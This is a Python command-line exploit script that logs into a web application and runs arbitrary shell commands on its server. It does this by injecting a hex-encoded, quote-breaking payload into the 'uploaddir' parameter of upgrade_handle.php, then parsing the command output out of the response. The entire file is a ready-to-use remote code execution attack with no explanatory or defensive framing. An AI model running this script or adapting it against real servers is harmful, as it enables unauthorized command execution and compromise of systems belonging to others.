import argparse
import requests
import urllib.parse
import binascii
import http.cookiejar as cookielib
import re


def run(target, username, password, command):
    """ Authenticate us and execute exploitation """
    # Step 1. Authentication
    payload = {'language':'en', 'user':username, 'pass':password, 'submit':'Login'}
    r = requests.post(urllib.parse.urljoin(target, 'login.php'), data=payload, verify=False, allow_redirects=False)
    
    jar = r.cookies


    splitted_command = [command]
    for i in range(0, len(command)-1):
        if command[i] == " " and command[i+1] != "-":
            splitted_command = [command[:i], command[i+1:]]
            break
    
    # Encoding a payload
    if len(splitted_command) == 2:
        payload = "".join('\\\\x%s' % binascii.hexlify(char.encode('ascii')).decode("utf-8") for char in splitted_command[1])
        exploit = '\'||%s `echo -e "%s"`||\'' % (splitted_command[0], payload)
        print("Exploit: %s" % exploit)
    else:
        exploit = '\'||%s||\'' % (splitted_command[0])
        print("Exploit: %s" % exploit)

    # Step 3. Send a payload
    payload = {'cmd':'writeuploaddir', 'uploaddir':exploit}
    r = requests.get(urllib.parse.urljoin(target, 'upgrade_handle.php'), params=payload, verify=False, cookies=jar)

    # Step 4. Output processing to grab only needed output
    res = re.search('upload_tmp_dir=([^<>]*)<br />', str(r.content))
    if res: 
        print(res.group(1).replace('\\n', '\n'))


def main():
    """ Parse command line arguments and start exploit """
    parser = argparse.ArgumentParser(
            add_help=False,
            formatter_class=argparse.RawDescriptionHelpFormatter,
            epilog="Examples: %(prog)s -t http://192.168.0.1/ -u username -p password -c whoami")

    # Adds arguments to help menu
    parser.add_argument("-h", action="help", help="Print this help message then exit")
    parser.add_argument("-t", dest="target", required="yes", help="Target URL address like: https://localhost:443/")
    parser.add_argument("-u", dest="username", required="yes", help="Username to authenticate")
    parser.add_argument("-p", dest="password", required="yes", help="Password to authenticate")
    parser.add_argument("-c", dest="command", required="yes", help="Shell command to execute")

    # Assigns the arguments to various variables
    args = parser.parse_args()

    run(args.target, args.username, args.password, args.command)


#
# Main
#

if __name__ == "__main__":
    main()